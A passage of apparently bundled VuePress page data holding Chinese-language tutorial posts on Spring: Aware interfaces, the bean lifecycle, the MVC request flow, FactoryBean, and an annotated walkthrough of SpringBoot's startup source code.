的引用才是安全的方式，到这里终于可以说一说 aware 了\n\n\n# aware\n\naware 是 spring 中的一个根接口，继承该接口的子接口有很多，比如周期图中的那三个 aware，但是该接口没有任何方法，所以大家可以把它理解成一个标记接口：\n\naware 翻译过来可以理解为"察觉的；注意到的；感知的" ，xxxxaware 也就是对....感知的，没有 aware 就是无感知的吗？对喽\n\n> spring 的依赖注入最大亮点就是所有的 bean 对 spring 容器的存在是没有意识的，拿spring bean 生命周期之“我从哪里来”？文章中“小学生入少先队”为例子说明，小学生还是那个小学生，加入少先队还是加入共青团只不过规则不一样罢了\n\n但是在实际项目中，我们不可避免的要用到 spring 容器本身提供的资源（难免要有事情需要少先队组织的帮助），这时候要让 bean 主动意识到 spring 容器的存在，才能调用 spring 所提供的资源，这就是 spring aware. 其实 spring aware 是 spring 设计为框架内部使用的，若使用了，你的 bean 将会和 spring 框架耦合，所以自己不单独使用，但是在读框架源码时希望你不再模糊.\n\n常见的 spring aware 接口\n\naware子接口                         描述\nbeannameaware                    获取容器中 bean 的名称\nbeanfactoryaware                 获取当前 beanfactory ，这样可以调用容器的服务\napplicationcontextaware          同上，在beanfactory 和 applicationcontext 的区别中已明确说明\nmessagesourceaware               获取 message source 相关文本信息\napplicationeventpublisheraware   发布事件\nresourceloaderaware              获取资源加载器，这样获取外部资源文件\n\n来看类关系图：\n\n\n\n当然不止以上这些 aware， 通常使用 spring aware 的目的是为了让 bean 获得 spring 容器的服务。\n\n\n# 代码示例\n\n\n# beannameaware\n\n\n\n注册 bean\n\n运行\n\n和预想一样，bean name 输出结果为mycustombeanname，如果移除掉 @bean 注解的 name 属性， 输出结果为getmybeanname\n\n\n# 总结\n\n在大多数情况下，我们应该避免使用任何 aware 接口，除非我们需要它们。实现这些接口会将代码耦合到spring框架，但是希望看过本节内容之后阅读框架源码思维更加清晰\n\n\n# 灵魂追问\n\n 1. 框架中有哪些经典的 aware 应用？\n\n 2. 到现在你能很好的理解 spring bean 的生命周期吗？',charsets:{cjk:!0},lastUpdated:"2022/04/27, 13:26:21",lastUpdatedTimestamp:1651037181e3},{title:"spring bean的生命周期",frontmatter:{title:"spring bean的生命周期",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/1ac696/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/05.spring%20bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"04.java/04.spring/05.spring bean的生命周期.md",key:"v-b52d430a",path:"/pages/1ac696/",headers:[{level:2,title:"1. 实例化Bean",slug:"_1-实例化bean",normalizedTitle:"1. 实例化bean",charIndex:136},{level:2,title:"2. 设置对象属性（依赖注入）",slug:"_2-设置对象属性-依赖注入",normalizedTitle:"2. 设置对象属性（依赖注入）",charIndex:408},{level:2,title:"3. 注入Aware接口",slug:"_3-注入aware接口",normalizedTitle:"3. 注入aware接口",charIndex:554},{level:2,title:"4. BeanPostProcessor",slug:"_4-beanpostprocessor",normalizedTitle:"4. beanpostprocessor",charIndex:648},{level:2,title:"5. InitializingBean与init-method",slug:"_5-initializingbean与init-method",normalizedTitle:"5. initializingbean与init-method",charIndex:1074},{level:2,title:"6. DisposableBean和destroy-method",slug:"_6-disposablebean和destroy-method",normalizedTitle:"6. disposablebean和destroy-method",charIndex:1515}],headersStr:"1. 实例化Bean 2. 设置对象属性（依赖注入） 3. 注入Aware接口 4. BeanPostProcessor 5. InitializingBean与init-method 6. DisposableBean和destroy-method",content:"Spring Bean 生命周期之“我从哪里来”？\n\nSpring Bean 生命周期之“我要到哪里去”？\n\n有任何引用的时候被垃圾回收机制回收。而由Spring IoC容器托管的对象，它们的生命周期完全由容器控制。Spring中每个Bean的生命周期如下：\n\n\n\n\n# 1. 实例化Bean\n\n对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。 对于ApplicationContext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取BeanDefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。 实例化对象被包装在BeanWrapper对象中，BeanWrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。\n\n\n# 2. 设置对象属性（依赖注入）\n\n实例化后的对象被封装在BeanWrapper对象中，并且此时对象仍然是一个原生的状态，并没有进行依赖注入。 紧接着，Spring根据BeanDefinition中的信息进行依赖注入。 并且通过BeanWrapper提供的设置属性的接口完成依赖注入。\n\n\n# 3. 注入Aware接口\n\n紧接着，Spring会检测该对象是否实现了xxxAware接口，并将相关的xxxAware实例注入给bean。 Spring Aware 到底是个啥？\n\n\n# 4. BeanPostProcessor\n\n当经过上述几个步骤后，bean对象已经被正确构造，但如果你想要对象被使用前再进行一些自定义的处理，就可以通过BeanPostProcessor接口实现。 该接口提供了两个函数：\n\n * postProcessBeforeInitialzation( Object bean, String beanName ) 当前正在初始化的bean对象会被传递进来，我们就可以对这个bean作任何处理。 这个函数会先于InitialzationBean执行，因此称为前置处理。 所有Aware接口的注入就是在这一步完成的。\n * postProcessAfterInitialzation( Object bean, String beanName ) 当前正在初始化的bean对象会被传递进来，我们就可以对这个bean作任何处理。 这个函数会在InitialzationBean完成后执行，因此称为后置处理。\n\n\n# 5. InitializingBean与init-method\n\n当BeanPostProcessor的前置处理完成后就会进入本阶段。 InitializingBean接口只有一个函数：\n\n * afterPropertiesSet()\n\n这一阶段也可以在bean正式构造完成前增加我们自定义的逻辑，但它与前置处理不同，由于该函数并不会把当前bean对象传进来，因此在这一步没办法处理对象本身，只能增加一些额外的逻辑。 若要使用它，我们需要让bean实现该接口，并把要增加的逻辑写在该函数中。然后Spring会在前置处理完成后检测当前bean是否实现了该接口，并执行afterPropertiesSet函数。\n\n当然，Spring为了降低对客户代码的侵入性，给bean的配置提供了init-method属性，该属性指定了在这一阶段需要执行的函数名。Spring便会在初始化阶段执行我们设置的函数。init-method本质上仍然使用了InitializingBean接口。\n\n\n# 6. DisposableBean和destroy-method\n\n和init-method一样，通过给destroy-method指定函数，就可以在bean销毁前执行指定的逻辑。",normalizedContent:"spring bean 生命周期之“我从哪里来”？\n\nspring bean 生命周期之“我要到哪里去”？\n\n有任何引用的时候被垃圾回收机制回收。而由spring ioc容器托管的对象，它们的生命周期完全由容器控制。spring中每个bean的生命周期如下：\n\n\n\n\n# 1. 实例化bean\n\n对于beanfactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createbean进行实例化。 对于applicationcontext容器，当容器启动结束后，便实例化所有的bean。 容器通过获取beandefinition对象中的信息进行实例化。并且这一步仅仅是简单的实例化，并未进行依赖注入。 实例化对象被包装在beanwrapper对象中，beanwrapper提供了设置对象属性的接口，从而避免了使用反射机制设置属性。\n\n\n# 2. 设置对象属性（依赖注入）\n\n实例化后的对象被封装在beanwrapper对象中，并且此时对象仍然是一个原生的状态，并没有进行依赖注入。 紧接着，spring根据beandefinition中的信息进行依赖注入。 并且通过beanwrapper提供的设置属性的接口完成依赖注入。\n\n\n# 3. 注入aware接口\n\n紧接着，spring会检测该对象是否实现了xxxaware接口，并将相关的xxxaware实例注入给bean。 spring aware 到底是个啥？\n\n\n# 4. beanpostprocessor\n\n当经过上述几个步骤后，bean对象已经被正确构造，但如果你想要对象被使用前再进行一些自定义的处理，就可以通过beanpostprocessor接口实现。 该接口提供了两个函数：\n\n * postprocessbeforeinitialzation( object bean, string beanname ) 当前正在初始化的bean对象会被传递进来，我们就可以对这个bean作任何处理。 这个函数会先于initialzationbean执行，因此称为前置处理。 所有aware接口的注入就是在这一步完成的。\n * postprocessafterinitialzation( object bean, string beanname ) 当前正在初始化的bean对象会被传递进来，我们就可以对这个bean作任何处理。 这个函数会在initialzationbean完成后执行，因此称为后置处理。\n\n\n# 5. initializingbean与init-method\n\n当beanpostprocessor的前置处理完成后就会进入本阶段。 initializingbean接口只有一个函数：\n\n * afterpropertiesset()\n\n这一阶段也可以在bean正式构造完成前增加我们自定义的逻辑，但它与前置处理不同，由于该函数并不会把当前bean对象传进来，因此在这一步没办法处理对象本身，只能增加一些额外的逻辑。 若要使用它，我们需要让bean实现该接口，并把要增加的逻辑写在该函数中。然后spring会在前置处理完成后检测当前bean是否实现了该接口，并执行afterpropertiesset函数。\n\n当然，spring为了降低对客户代码的侵入性，给bean的配置提供了init-method属性，该属性指定了在这一阶段需要执行的函数名。spring便会在初始化阶段执行我们设置的函数。init-method本质上仍然使用了initializingbean接口。\n\n\n# 6. disposablebean和destroy-method\n\n和init-method一样，通过给destroy-method指定函数，就可以在bean销毁前执行指定的逻辑。",charsets:{cjk:!0},lastUpdated:"2022/04/27, 13:26:21",lastUpdatedTimestamp:1651037181e3},{title:"Spring MVC原理及配置详解",frontmatter:{title:"Spring MVC原理及配置详解",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/40850c/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/06.Spring%20MVC%E5%8E%9F%E7%90%86%E5%8F%8A%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html",relativePath:"04.java/04.spring/06.Spring MVC原理及配置详解.md",key:"v-49818cb1",path:"/pages/40850c/",headersStr:null,content:"(1) Http请求：客户端请求提交到DispatcherServlet。\n\n(2) 寻找处理器：由DispatcherServlet控制器查询一个或多个HandlerMapping，找到处理请求的Controller。\n\n(3) 调用处理器：DispatcherServlet将请求提交到Controller。\n\n(4)(5)调用业务处理和返回结果：Controller调用业务逻辑处理后，返回ModelAndView。\n\n(6)(7)处理视图映射并返回模型： DispatcherServlet查询一个或多个ViewResoler视图解析器，找到ModelAndView指定的视图。\n\n(8) Http响应：视图负责将结果显示到客户端。",normalizedContent:"(1) http请求：客户端请求提交到dispatcherservlet。\n\n(2) 寻找处理器：由dispatcherservlet控制器查询一个或多个handlermapping，找到处理请求的controller。\n\n(3) 调用处理器：dispatcherservlet将请求提交到controller。\n\n(4)(5)调用业务处理和返回结果：controller调用业务逻辑处理后，返回modelandview。\n\n(6)(7)处理视图映射并返回模型： dispatcherservlet查询一个或多个viewresoler视图解析器，找到modelandview指定的视图。\n\n(8) http响应：视图负责将结果显示到客户端。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Spring中的FactoryBean接口",frontmatter:{title:"Spring中的FactoryBean接口",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/5e8cb5/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/07.Spring%E4%B8%AD%E7%9A%84FactoryBean%E6%8E%A5%E5%8F%A3.html",relativePath:"04.java/04.spring/07.Spring中的FactoryBean接口.md",key:"v-3d2f6db6",path:"/pages/5e8cb5/",headersStr:null,content:"1.前提概要\n\n很多java开发者在使用Spring框架中都见过后缀为FactoryBean的类，比如Mybatis-Spring中的SqlSessionFactoryBean。说到这里就不得不提BeanFactory。FactoryBean和BeanFactory特别容易让人混淆，面试还经常问到这两种概念。其实它们的作用和使用场景是不一样的。\n\n2.BeanFactory\n\n先来说说BeanFactory。用于访问Spring bean容器的根接口。这是Spring bean容器的基本客户端视图。原来是获取Spring Bean的接口，也就是IoC容器。然后我们看类图。\n\n\n\n原来我们更常用的ApplicationContext就是一个BeanFactory。我们通过bean的名称或者类型都可以从BeanFactory来获取bean。对于BeanFactory这么介绍相信都不陌生了。让我们把关注点转向FactoryBean上。\n\n3.FactoryBean\n\nFactoryBean 是个什么玩意儿呢？来看看源码。\n\n\n\n * T getObject() 获取泛型T的实例。用来创建Bean。当IoC容器通过getBean方法来FactoryBean创建的实例时实际获取的不是FactoryBean 本身而是具体创建的T泛型实例。等下我们会来验证这个事情。\n * Class<?> getObjectType() 获取 T getObject()中的返回值 T 的具体类型。这里强烈建议如果T是一个接口，返回其具体实现类的类型。\n * default boolean isSingleton() 用来规定 Factory创建的的bean是否是单例。这里通过默认方法定义为单例。\n\n3.1 FactoryBean使用场景\n\nFactoryBean 用来创建一类bean。比如你有一些同属鸟类的bean需要被创建，但是它们自己有各自的特点，你只需要把他们的特点注入FactoryBean中就可以生产出各种鸟类的实例。举一个更加贴近实际生产的例子。甚至这个例子你可以应用到实际java开发中去。我们需要自己造一个定时任务的轮子。用FactoryBean 再合适不过了。我们来用代码说话一步步来演示FactoryBean的使用场景。\n\n3.2 构建一个FactoryBean\n\n我们声明定时任务一般具有下列要素：\n\n * 时间周期，肯定会使用到cron表达式。\n * 一个任务的执行抽象接口。\n * 定时任务具体行为的执行者。\n\nTask任务执行抽象接口的实现。实现包含两个方面：\n\n * SomeService 是具体任务的执行逻辑。\n * cron时间表达式\n\n\n\n通过以上的定义。任务的时间和任务的逻辑可以根据不同的业务做到差异化配置。然后我们实现一个关于Task的FactoryBean。\n\n\n\n3.3 FactoryBean 注入IoC\n\n你可以使用xml的注入方式，当然也可以使用javaConfig的配置方式。这里我们使用javaConfig注入。我们将两个FactroyBean注入到Spring容器中去。\n\n\n\n3.4 FactoryBean的一些特点\n\n一般如上声明后，@Bean注解如果不显式声明bean名称则方法名作为bean的名称，而且返回值作为注入的Bean。但是我们通过debug发现却是这样的：\n\n也就是说通过方法名是返回FactoryBean 创建的Bean。那么如何返回该FactoryBean呢？上图中也给出了答案在方法前增加引用符“&”。具体的原因还用从BeanFactory中寻找，真是不是冤家不聚头。\n\n我们对上面声明的两个bean进行测试，也出色地完成了不同的定时任务业务逻辑。\n\n",normalizedContent:"1.前提概要\n\n很多java开发者在使用spring框架中都见过后缀为factorybean的类，比如mybatis-spring中的sqlsessionfactorybean。说到这里就不得不提beanfactory。factorybean和beanfactory特别容易让人混淆，面试还经常问到这两种概念。其实它们的作用和使用场景是不一样的。\n\n2.beanfactory\n\n先来说说beanfactory。用于访问spring bean容器的根接口。这是spring bean容器的基本客户端视图。原来是获取spring bean的接口，也就是ioc容器。然后我们看类图。\n\n\n\n原来我们更常用的applicationcontext就是一个beanfactory。我们通过bean的名称或者类型都可以从beanfactory来获取bean。对于beanfactory这么介绍相信都不陌生了。让我们把关注点转向factorybean上。\n\n3.factorybean\n\nfactorybean 是个什么玩意儿呢？来看看源码。\n\n\n\n * t getobject() 获取泛型t的实例。用来创建bean。当ioc容器通过getbean方法来factorybean创建的实例时实际获取的不是factorybean 本身而是具体创建的t泛型实例。等下我们会来验证这个事情。\n * class<?> getobjecttype() 获取 t getobject()中的返回值 t 的具体类型。这里强烈建议如果t是一个接口，返回其具体实现类的类型。\n * default boolean issingleton() 用来规定 factory创建的的bean是否是单例。这里通过默认方法定义为单例。\n\n3.1 factorybean使用场景\n\nfactorybean 用来创建一类bean。比如你有一些同属鸟类的bean需要被创建，但是它们自己有各自的特点，你只需要把他们的特点注入factorybean中就可以生产出各种鸟类的实例。举一个更加贴近实际生产的例子。甚至这个例子你可以应用到实际java开发中去。我们需要自己造一个定时任务的轮子。用factorybean 再合适不过了。我们来用代码说话一步步来演示factorybean的使用场景。\n\n3.2 构建一个factorybean\n\n我们声明定时任务一般具有下列要素：\n\n * 时间周期，肯定会使用到cron表达式。\n * 一个任务的执行抽象接口。\n * 定时任务具体行为的执行者。\n\ntask任务执行抽象接口的实现。实现包含两个方面：\n\n * someservice 是具体任务的执行逻辑。\n * cron时间表达式\n\n\n\n通过以上的定义。任务的时间和任务的逻辑可以根据不同的业务做到差异化配置。然后我们实现一个关于task的factorybean。\n\n\n\n3.3 factorybean 注入ioc\n\n你可以使用xml的注入方式，当然也可以使用javaconfig的配置方式。这里我们使用javaconfig注入。我们将两个factroybean注入到spring容器中去。\n\n\n\n3.4 factorybean的一些特点\n\n一般如上声明后，@bean注解如果不显式声明bean名称则方法名作为bean的名称，而且返回值作为注入的bean。但是我们通过debug发现却是这样的：\n\n也就是说通过方法名是返回factorybean 创建的bean。那么如何返回该factorybean呢？上图中也给出了答案在方法前增加引用符“&”。具体的原因还用从beanfactory中寻找，真是不是冤家不聚头。\n\n我们对上面声明的两个bean进行测试，也出色地完成了不同的定时任务业务逻辑。\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"SpringBoot应用启动过程分析",frontmatter:{title:"SpringBoot应用启动过程分析",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/a40320/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/08.SpringBoot%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90.html",relativePath:"04.java/04.spring/08.SpringBoot应用启动过程分析.md",key:"v-01a0958e",path:"/pages/a40320/",headers:[{level:2,title:"1.进入SpringApplication",slug:"_1-进入springapplication",normalizedTitle:"1.进入springapplication",charIndex:2},{level:2,title:"2.SpringApplication构造器分析",slug:"_2-springapplication构造器分析",normalizedTitle:"2.springapplication构造器分析",charIndex:314},{level:3,title:"2.1 设置初始化器",slug:"_2-1-设置初始化器",normalizedTitle:"2.1 设置初始化器",charIndex:1788},{level:3,title:"2.2.设置监听器",slug:"_2-2-设置监听器",normalizedTitle:"2.2.设置监听器",charIndex:3236},{level:2,title:"3. run(String... args)解析",slug:"_3-run-string-args-解析",normalizedTitle:"3. run(string... args)解析",charIndex:4108},{level:3,title:"3.1 获取run listeners",slug:"_3-1-获取run-listeners",normalizedTitle:"3.1 获取run listeners",charIndex:6910},{level:3,title:"3.2 发出开始执行的事件",slug:"_3-2-发出开始执行的事件",normalizedTitle:"3.2 发出开始执行的事件",charIndex:7943},{level:3,title:"3.3 环境准备",slug:"_3-3-环境准备",normalizedTitle:"3.3 环境准备",charIndex:9652},{level:3,title:"3.4 创建ApplicationContext",slug:"_3-4-创建applicationcontext",normalizedTitle:"3.4 创建applicationcontext",charIndex:11058},{level:3,title:"3.5 context前置处理阶段",slug:"_3-5-context前置处理阶段",normalizedTitle:"3.5 context前置处理阶段",charIndex:12935},{level:3,title:"3.6 刷新容器",slug:"_3-6-刷新容器",normalizedTitle:"3.6 刷新容器",charIndex:14685},{level:3,title:"3.7 后置操作，调用Runners",slug:"_3-7-后置操作-调用runners",normalizedTitle:"3.7 后置操作，调用runners",charIndex:16645},{level:3,title:"3.8 发布ApplicationReadyEvent事件",slug:"_3-8-发布applicationreadyevent事件",normalizedTitle:"3.8 发布applicationreadyevent事件",charIndex:17582}],headersStr:"1.进入SpringApplication 2.SpringApplication构造器分析 2.1 设置初始化器 2.2.设置监听器 3. run(String... args)解析 3.1 获取run listeners 3.2 发出开始执行的事件 3.3 环境准备 3.4 创建ApplicationContext 3.5 context前置处理阶段 3.6 刷新容器 3.7 后置操作，调用Runners 3.8 发布ApplicationReadyEvent事件",content:'# 1.进入SpringApplication\n\npublic static ConfigurableApplicationContext run(Class<?>[] primarySources,\n      String[] args) {\n   return new SpringApplication(primarySources).run(args);\n}\n\n\n1\n2\n3\n4\n\n\n我们根据DemoApplication跟进代码，发现其调用的SpringApplication类的run方法。这个方法就干了2件事：一是创建SpringApplication对象，二是启动SpringApplication。\n\n\n# 2.SpringApplication构造器分析\n\npublic SpringApplication(Class<?>... primarySources) {\n    this(null, primarySources);\n}\n/**\n* Create a new {@link SpringApplication} instance. The application context will load\n* beans from the specified primary sources\n*/\npublic SpringApplication(ResourceLoader resourceLoader, Class<?>... primarySources) {\n   this.resourceLoader = resourceLoader;\n   Assert.notNull(primarySources, "PrimarySources must not be null");\n   this.primarySources = new LinkedHashSet<>(Arrays.asList(primarySources));\n  //根据应用是否存在某些类推断应用类型，分为响应式web应用，servlet类型web应用和非web应用，在后面用于确定实例化applicationContext的类型\n   this.webApplicationType = WebApplicationType.deduceFromClasspath();\n   //设置初始化器，读取spring.factories文件key ApplicationContextInitializer对应的value并实例化\n   //ApplicationContextInitializer接口用于在Spring上下文被刷新之前进行初始化的操作\n   setInitializers((Collection) getSpringFactoriesInstances(\n         ApplicationContextInitializer.class));\n\n   //设置监听器，读取spring.factories文件key ApplicationListener对应的value并实例化\n   // interface ApplicationListener<E extends ApplicationEvent> extends EventListener\n   //ApplicationListener继承EventListener，实现了观察者模式。对于Spring框架的观察者模式实现，它限定感兴趣的事件类型需要是ApplicationEvent类型事件\n\n   setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));\n   //没啥特别作用，仅用于获取入口类class对象\n   this.mainApplicationClass = deduceMainApplicationClass();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n在构造器里主要干了2件事，一个设置初始化器，二是设置监听器。\n\n\n# 2.1 设置初始化器\n\nsetInitializers((Collection) getSpringFactoriesInstances(\n      ApplicationContextInitializer.class));\nprivate <T> Collection<T> getSpringFactoriesInstances(Class<T> type) {\n   return getSpringFactoriesInstances(type, new Class<?>[] {});\n}\n\nprivate <T> Collection<T> getSpringFactoriesInstances(Class<T> type,\n      Class<?>[] parameterTypes, Object... args) {\n   ClassLoader classLoader = getClassLoader();\n   // Use names and ensure unique to protect against duplicates\n   Set<String> names = new LinkedHashSet<>(\n    //从类路径的META-INF处读取相应配置文件spring.factories，然后进行遍历，读取配置文件中Key(type)对应的value\n         SpringFactoriesLoader.loadFactoryNames(type, classLoader));\n   //将names的对象实例化\n   List<T> instances = createSpringFactoriesInstances(type, parameterTypes,\n         classLoader, args, names);\n   AnnotationAwareOrderComparator.sort(instances);\n   return instances;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n根据入参type类型ApplicationContextInitializer.class从类路径的META-INF处读取相应配置文件spring.factories并实例化对应Initializer。上面这2个函数后面会反复用到。\n\norg.springframework.context.ApplicationContextInitializer=\\\norg.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer,\\\norg.springframework.boot.context.ContextIdApplicationContextInitializer,\\\norg.springframework.boot.context.config.DelegatingApplicationContextInitializer,\\\norg.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.2.设置监听器\n\nsetListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));\n\n\n1\n\n\n和设置初始化器一个套路，通过getSpringFactoriesInstances函数实例化监听器。\n\norg.springframework.context.ApplicationListener=\\\norg.springframework.boot.ClearCachesApplicationListener,\\\norg.springframework.boot.builder.ParentContextCloserApplicationListener,\\\norg.springframework.boot.context.FileEncodingApplicationListener,\\\norg.springframework.boot.context.config.AnsiOutputApplicationListener,\\\norg.springframework.boot.context.config.ConfigFileApplicationListener,\\\norg.springframework.boot.context.config.DelegatingApplicationListener,\\\norg.springframework.boot.context.logging.ClasspathLoggingApplicationListener,\\\norg.springframework.boot.context.logging.LoggingApplicationListener,\\\norg.springframework.boot.liquibase.LiquibaseServiceLocatorApplicationListener\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 3. run(String... args)解析\n\n/**\n* Run the Spring application, creating and refreshing a new ApplicationContext\n*/\n\npublic ConfigurableApplicationContext run(String... args) {\n   //计时器\n   StopWatch stopWatch = new StopWatch();\n   stopWatch.start();\n\n   ConfigurableApplicationContext context = null;\n   Collection<SpringBootExceptionReporter> exceptionReporters = new ArrayList<>();\n\n   //设置java.awt.headless系统属性为true，Headless模式是系统的一种配置模式。\n   // 在该模式下，系统缺少了显示设备、键盘或鼠标。但是服务器生成的数据需要提供给显示设备等使用。\n   // 因此使用headless模式，一般是在程序开始激活headless模式，告诉程序，现在你要工作在Headless        mode下，依靠系统的计算能力模拟出这些特性来\n   configureHeadlessProperty();\n\n   //获取监听器集合对象\n   SpringApplicationRunListeners listeners = getRunListeners(args);\n\n   //发出开始执行的事件。\n   listeners.starting();\n\n   try {\n      //根据main函数传入的参数，创建DefaultApplicationArguments对象\n      ApplicationArguments applicationArguments = new DefaultApplicationArguments(\n            args);\n      //根据扫描到的监听器对象和函数传入参数，进行环境准备。\n      ConfigurableEnvironment environment = prepareEnvironment(listeners,\n            applicationArguments);\n\n      configureIgnoreBeanInfo(environment);\n      Banner printedBanner = printBanner(environment);\n\n      context = createApplicationContext();\n\n      //和上面套路一样，读取spring.factories文件key SpringBootExceptionReporter对应的value\n      exceptionReporters = getSpringFactoriesInstances(\n            SpringBootExceptionReporter.class,\n            new Class[] { ConfigurableApplicationContext.class }, context);\n\n      prepareContext(context, environment, listeners, applicationArguments,\n            printedBanner);\n\n      //和上面的一样，context准备完成之后，将触发SpringApplicationRunListener的contextPrepared执行\n      refreshContext(context);\n\n      //其实啥也没干。但是老版本的callRunners好像是在这里执行的。\n      afterRefresh(context, applicationArguments);\n\n      stopWatch.stop();\n      if (this.logStartupInfo) {\n         new StartupInfoLogger(this.mainApplicationClass)\n               .logStarted(getApplicationLog(), stopWatch);\n      }\n      //发布ApplicationStartedEvent事件，发出结束执行的事件\n      listeners.started(context);\n      //在某些情况下，我们希望在容器bean加载完成后执行一些操作，会实现ApplicationRunner或者CommandLineRunner接口\n      //后置操作，就是在容器完成刷新后，依次调用注册的Runners，还可以通过@Order注解设置各runner的执行顺序。\n      callRunners(context, applicationArguments);\n   }\n   catch (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, listeners);\n      throw new IllegalStateException(ex);\n   }\n\n   try {\n      listeners.running(context);\n   }\n   catch (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, null);\n      throw new IllegalStateException(ex);\n   }\n   return context;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n\n# 3.1 获取run listeners\n\nSpringApplicationRunListeners listeners = getRunListeners(args);\n\n\n1\n\n\n和构造器设置初始化器一个套路，根据传入type SpringApplicationRunListener去扫描spring.factories文件，读取type对应的value并实例化。然后利用实例化对象创建SpringApplicationRunListeners对象。\n\norg.springframework.boot.SpringApplicationRunListener=\\\norg.springframework.boot.context.event.EventPublishingRunListener\n\n\n1\n2\n\n\nEventPublishingRunListener的作用是发布SpringApplicationEvent事件。\n\nEventPublishingRunListener更像是被监听对象，这个命名让我有点迷。\n\npublic class EventPublishingRunListener implements SpringApplicationRunListener, Ordered {\n    ......\n   @Override\n   public void starting() {\n      this.initialMulticaster.multicastEvent(\n            new ApplicationStartingEvent(this.application, this.args));\n   }\n\n   @Override\n   public void environmentPrepared(ConfigurableEnvironment environment) {\n      this.initialMulticaster.multicastEvent(new ApplicationEnvironmentPreparedEvent(\n            this.application, this.args, environment));\n   }\n    ........\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 3.2 发出开始执行的事件\n\nlisteners.starting();\n\n\n1\n\n\n继续跟进starting函数，\n\npublic void starting() {\n   this.initialMulticaster.multicastEvent(\n         new ApplicationStartingEvent(this.application, this.args));\n}\n//获取ApplicationStartingEvent类型的事件后，发布事件\n    @Override\n    public void multicastEvent(final ApplicationEvent event, @Nullable ResolvableType eventType) {\n        ResolvableType type = (eventType != null ? eventType : resolveDefaultEventType(event));\n        for (final ApplicationListener<?> listener : getApplicationListeners(event, type)) {\n            Executor executor = getTaskExecutor();\n            if (executor != null) {\n                executor.execute(() -> invokeListener(listener, event));\n            }\n            else {\n                invokeListener(listener, event);\n            }\n        }\n    }\n//继续跟进invokeListener方法,最后调用ApplicationListener监听者的onApplicationEvent处理事件\n    private void doInvokeListener(ApplicationListener listener, ApplicationEvent event) {\n        try {\n            listener.onApplicationEvent(event);\n        }\n        catch (ClassCastException ex) {\n            .....\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n这个后面也会反复遇到，比如listeners.running(context)。\n\n这里是典型的观察者模式。\n\n//观察者：监听<E extends ApplicationEvent>类型事件\nApplicationListener<E extends ApplicationEvent> extends EventListener\n\n//事件类型：\nEvent extends SpringApplicationEvent  extends ApplicationEvent extends EventObject\n\n//被观察者：发布事件\nEventPublishingRunListener implements SpringApplicationRunListener\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nSpringApplication根据当前事件Event类型，比如ApplicationStartingEvent，查找到监听ApplicationStartingEvent的观察者EventPublishingRunListener，调用观察者的onApplicationEvent处理事件。\n\n\n# 3.3 环境准备\n\n//根据main函数传入的参数，创建DefaultApplicationArguments对象\nApplicationArguments applicationArguments = new DefaultApplicationArguments(\n      args);\n//根据扫描到的listeners对象和函数传入参数，进行环境准备。\nConfigurableEnvironment environment = prepareEnvironment(listeners,\n      applicationArguments);\n\n\n1\n2\n3\n4\n5\n6\n\n\nApplicationArguments提供运行application的参数，后面会作为一个Bean注入到容器。这里重点说下prepareEnvironment方法做了些什么。\n\nprivate ConfigurableEnvironment prepareEnvironment(\n      SpringApplicationRunListeners listeners,\n      ApplicationArguments applicationArguments) {\n\n   // Create and configure the environment\n   ConfigurableEnvironment environment = getOrCreateEnvironment();\n\n   configureEnvironment(environment, applicationArguments.getSourceArgs());\n\n    //和listeners.starting一样的流程\n   listeners.environmentPrepared(environment);\n\n   